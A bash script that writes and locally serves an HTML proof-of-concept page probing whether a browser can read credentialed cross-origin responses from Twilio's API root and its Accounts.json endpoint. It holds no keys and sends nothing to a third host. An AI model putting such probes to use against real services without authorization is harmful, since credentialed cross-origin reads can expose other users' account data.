#!/usr/bin/env bash
set -euo pipefail

HOST="127.0.0.1"
PORT="8080"
FILE="/tmp/cors-demo.html"

cat > "$FILE" <<'HTML'
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Twilio CORS PoC</title>
  <style>
    body {
      font: 16px system-ui, sans-serif;
      max-width: 900px;
      margin: 40px auto;
      line-height: 1.5;
    }
    pre {
      background: #111;
      color: #0f0;
      padding: 16px;
      white-space: pre-wrap;
      overflow-wrap: anywhere;
    }
    button {
      padding: 10px 16px;
      cursor: pointer;
    }
    .warning {
      padding: 12px;
      background: #fff3cd;
      border: 1px solid #ffe69c;
    }
  </style>
</head>
<body>
  <h1>Twilio CORS PoC</h1>

  <p>
    Origin:
    <code id="origin"></code>
  </p>

  <div class="warning">
    This PoC deliberately does not contain a Twilio API key or secret.
    It tests whether the browser is permitted to read the response.
  </div>

  <p>
    <button onclick="testPublic()">Test API root</button>
    <button onclick="testAccounts()">Test Accounts endpoint</button>
  </p>

  <pre id="output">Waiting...</pre>

<script>
const output = document.getElementById("output");
document.getElementById("origin").textContent = location.origin;

function show(title, response, body) {
  output.textContent =
    title + "\n\n" +
    "HTTP " + response.status + " " + response.statusText + "\n\n" +
    "Response body:\n" + body;
}

async function testPublic() {
  output.textContent = "Testing API root...";

  try {
    const response = await fetch("https://api.twilio.com/", {
      method: "GET",
      credentials: "include"
    });

    const body = await response.text();
    show("API ROOT", response, body);
  } catch (err) {
    output.textContent =
      "Browser blocked the request or the network request failed:\n\n" +
      err;
  }
}

async function testAccounts() {
  output.textContent =
    "Testing /Accounts.json without supplying an API key...";

  try {
    const response = await fetch(
      "https://api.twilio.com/2010-04-01/Accounts.json",
      {
        method: "GET",
        credentials: "include"
      }
    );

    const body = await response.text();

    show(
      "ACCOUNTS ENDPOINT — NO API CREDENTIALS SUPPLIED",
      response,
      body
    );
  } catch (err) {
    output.textContent =
      "Browser blocked the request or the network request failed:\n\n" +
      err;
  }
}
</script>
</body>
</html>
HTML

echo "CORS PoC running at:"
echo "  http://${HOST}:${PORT}"
echo
echo "No Twilio credentials are placed in the browser."
echo "Press Ctrl-C to stop."

cd /tmp
python3 -m http.server "$PORT" --bind "$HOST"

